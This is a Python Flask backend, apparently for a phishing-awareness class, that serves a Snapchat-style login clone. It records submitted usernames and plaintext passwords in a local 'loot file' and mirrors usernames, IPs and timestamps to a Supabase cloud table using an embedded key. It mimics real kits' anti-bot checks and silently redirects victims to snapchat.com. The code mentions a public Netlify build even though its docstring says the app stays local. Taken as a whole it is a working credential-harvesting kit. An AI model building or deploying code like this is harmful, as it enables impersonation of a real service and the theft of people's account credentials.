"""
Phishing Awareness Demo — Flask backend
=======================================

A LOCAL-ONLY, clearly-labelled training simulation that teaches students how
credential-phishing pages work. It serves the existing Snapchat-style login
clone, logs form submissions into an in-memory dict, and bounces the
submitter straight to the genuine site — exactly the experience a real
phishing victim has (no reveal, no warning).

GUARDRAILS (part of the design — do not remove):
  * Binds to 127.0.0.1 only. Never expose this on a network.
  * No disclosure on the login page itself — victims are bounced to the
    genuine site with no reveal, like real phishing. The "this was a
    simulation" disclosure happens on the instructor-only pages
    (/password, /debrief/<id>) after class.
  * Submissions are stored in memory AND appended to captured_credentials.txt
    (a local teaching artifact, git-ignored) so the instructor can show the
    class the "attacker's file".
  * No lookalike domain, no real service, no credential forwarding.
  * The optional Supabase mirror (see _sync_supabase) sends MASKED passwords
    only — the real value never leaves this machine.

Run:
      pip install -r requirements.txt
      python app.py
Then open http://127.0.0.1:5000/login.html
"""

import json
import re
import threading
import time
import urllib.request
import uuid
from pathlib import Path

from flask import (
    Flask,
    redirect,
    render_template,
    request,
    send_from_directory,
    url_for,
)

app = Flask(__name__)

# Anchor to this file's directory so the app works no matter where it is
# launched from (not just from the project root).
BASE_DIR = Path(__file__).resolve().parent

# ---------------------------------------------------------------------------
# Demo configuration
# ---------------------------------------------------------------------------
MIN_USERNAME_LEN = 3   # matches the client-side rule in login.js
MIN_PASSWORD_LEN = 8   # matches the existing Snapchat-style rule
MAX_FIELD_LEN = 64
XHR_TOKEN = "demo-training-token-2026"  # stand-in for the anti-bot check

# Optional cloud mirror of the demo captures (see _sync_supabase below).
# The class project + publishable key. Only MASKED passwords are ever sent
# here — never the real ones. Table + RLS policy live in supabase_setup.sql.
SUPABASE_URL = "https://txusshocoamqmxsbbrdm.supabase.co"
SUPABASE_ANON_KEY = "sb_publishable_9LcvnXBET6EmqSfyqdysxA_fMKsIOlo"
SUPABASE_TABLE = "captures"

# In-memory "attacker database" — wiped on restart (demo only)
captures = {}


# ---------------------------------------------------------------------------
# Static pages — served from the existing folder, theme untouched
# ---------------------------------------------------------------------------
@app.route("/")
def index():
    return send_from_directory(str(BASE_DIR), "index.html")


@app.route("/index.html")
def index_html():
    return send_from_directory(str(BASE_DIR), "index.html")


@app.route("/Acconts.html")
def accounts():
    return send_from_directory(str(BASE_DIR), "Acconts.html")


@app.route("/login.html")
def login_page():
    return send_from_directory(str(BASE_DIR), "login.html")


@app.route("/css/<path:filename>")
def css(filename):
    return send_from_directory("css", filename)


@app.route("/js/<path:filename>")
def js(filename):
    return send_from_directory("js", filename)


@app.route("/img/<path:filename>")
def img(filename):
    return send_from_directory("img", filename)


@app.route("/api/mode")
def api_mode():
    """Mode marker for the shared login page. Returns 200 ("flask") when this
    classroom server is serving the pages. On the static Netlify build this
    route doesn't exist (404), which tells login.js to run the browser-only
    handoff instead of POSTing to /login."""
    return "flask"


# ---------------------------------------------------------------------------
# Helpers (server-side validation)
# ---------------------------------------------------------------------------
def _clean(value):
    """Normalise whitespace; None -> ''."""
    if value is None:
        return ""
    return re.sub(r"\s+", " ", value).strip()


def _looks_clean(value):
    """Reject obvious junk: control characters or oversized input."""
    if len(value) > MAX_FIELD_LEN:
        return False
    if any(ord(ch) < 32 for ch in value):
        return False
    return True


def _sync_supabase(entry):
    """Mirror one capture to the class Supabase project for the live
    "attacker's dashboard" demonstration. The password is sent MASKED only —
    the real value never leaves this machine. Best-effort: failures are logged
    and skipped so the demo never breaks on a network issue. Runs on a
    background thread so a slow network never delays the login redirect."""
    try:
        payload = {
            "username": entry["username"],
            "password_masked": "********",
            "created_at": entry["time"],
            "ip": entry["ip"],
        }
        req = urllib.request.Request(
            f"{SUPABASE_URL}/rest/v1/{SUPABASE_TABLE}",
            data=json.dumps(payload).encode("utf-8"),
            headers={
                "apikey": SUPABASE_ANON_KEY,
                "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
                "Content-Type": "application/json",
                "Prefer": "return=minimal",
            },
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            app.logger.info(
                "Supabase mirror OK (HTTP %s) for user=%s",
                resp.status,
                entry["username"],
            )
    except Exception as exc:
        app.logger.warning("Supabase mirror skipped: %s", exc)


# ---------------------------------------------------------------------------
# Login handler
# ---------------------------------------------------------------------------
@app.route("/login", methods=["POST"])
def login():
    # 1) Anti-bot marker check. Real phishing kits set a hidden field and/or
    #    an X-Requested-With header so naive crawlers are skipped. This demo
    #    mirrors that behaviour — if the marker is missing, reject the request.
    #    Note: a plain HTML form cannot set the X-Requested-With header (only
    #    AJAX can), so the hidden field is the path students will actually
    #    exercise; the header check is kept for completeness.
    hidden_ok = request.form.get("xrw", "") == XHR_TOKEN
    header_ok = request.headers.get("X-Requested-With") == "XMLHttpRequest"
    if not (hidden_ok or header_ok):
        return redirect(url_for("login_page", error="1"))

    username = _clean(request.form.get("name", ""))
    password = request.form.get("message", "")

    # 2) Minimal server-side validation (the client check can be bypassed).
    if (
        len(username) < MIN_USERNAME_LEN
        or not _looks_clean(username)
        or len(password) < MIN_PASSWORD_LEN
        or not _looks_clean(password)
    ):
        return redirect(url_for("login_page", error="1"))

    # 3) Demo "harvest": store in the in-memory dict.
    entry_id = uuid.uuid4().hex[:8]
    captures[entry_id] = {
        "username": username,
        "password": password,
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "ip": request.remote_addr,
        "user_agent": (request.headers.get("User-Agent") or "")[:120],
    }

    # 3b) Append to the instructor's "loot file" — a plaintext .txt that
    #     looks exactly like a real attacker's harvested-credentials file.
    #     Local teaching artifact only; never commit it (see .gitignore).
    try:
        with open(BASE_DIR / "captured_credentials.txt", "a", encoding="utf-8") as f:
            f.write(
                "[{t}] user={u} | pass={p} | ip={ip} | ua={ua}\n".format(
                    t=captures[entry_id]["time"],
                    u=username,
                    p=password,
                    ip=captures[entry_id]["ip"],
                    ua=captures[entry_id]["user_agent"],
                )
            )
    except OSError as exc:
        # Never crash the demo over file I/O, but log it so the instructor
        # knows if the loot file could not be written.
        app.logger.warning("Could not write capture file: %s", exc)

    # 4) Best-effort cloud mirror (masked passwords only) for the instructor's
    #    live "attacker's dashboard" in Supabase. Fire-and-forget so the
    #    redirect below is never delayed by the network.
    threading.Thread(
        target=_sync_supabase, args=(captures[entry_id],), daemon=True
    ).start()

    # 5) The real phishing ending: bounce the victim straight to the genuine
    #    site with no reveal. Real victims never realise anything happened —
    #    that is the teaching point. (The /debrief/<id> page still exists for
    #    the instructor to pull up during the lesson.)
    return redirect("https://www.snapchat.com/")


# ---------------------------------------------------------------------------
# Educational reveal — what an attacker captured (kept as an instructor tool;
# the login flow itself now bounces straight to snapchat.com)
# ---------------------------------------------------------------------------
@app.route("/debrief/<entry_id>")
def debrief(entry_id):
    entry = captures.get(entry_id)
    if entry is None:
        return redirect(url_for("login_page"))
    return render_template("debrief.html", entry=entry, entry_id=entry_id)


# ---------------------------------------------------------------------------
# Instructor views (localhost only) — /password is the "hidden" one
# ---------------------------------------------------------------------------
def _load_captures_from_file():
    """Read historical captures back from captured_credentials.txt so the
    instructor page survives server restarts (the in-memory dict does not).
    Lines look like:
      [2026-08-11 21:38:40] user=alice | pass=hunter2 | ip=127.0.0.1 | ua=...
    Returns {(time, username, ip): entry} for every line that parses."""
    entries = {}
    path = BASE_DIR / "captured_credentials.txt"
    if not path.exists():
        return entries
    try:
        with open(path, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                m = re.match(
                    r"^\[([^\]]+)\] user=(.*?) \| pass=(.*?) \| ip=(.*?) \| ua=(.*)$",
                    line,
                )
                if not m:
                    continue
                t, username, password, ip, ua = m.groups()
                entries[(t, username, ip)] = {
                    "username": username,
                    "password": password,
                    "time": t,
                    "ip": ip,
                    "user_agent": ua,
                }
    except OSError:
        pass
    return entries


@app.route("/captures")
@app.route("/password")
def view_captures():
    if request.remote_addr not in ("127.0.0.1", "::1"):
        return "Forbidden — localhost only", 403

    # Merge the live in-memory dict with the persistent file log, de-duplicating
    # by (time, username, ip) so a submission never appears twice. Newest first;
    # cap at the 200 most recent so a long class log stays readable.
    merged = dict(_load_captures_from_file())
    merged.update(
        {(e["time"], e["username"], e["ip"]): e for e in captures.values()}
    )
    ordered = sorted(merged.values(), key=lambda e: e["time"], reverse=True)[:200]

    # Keep the template untouched: hand it a dict keyed by position.
    return render_template(
        "captures.html", captures={str(i): e for i, e in enumerate(ordered)}
    )


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
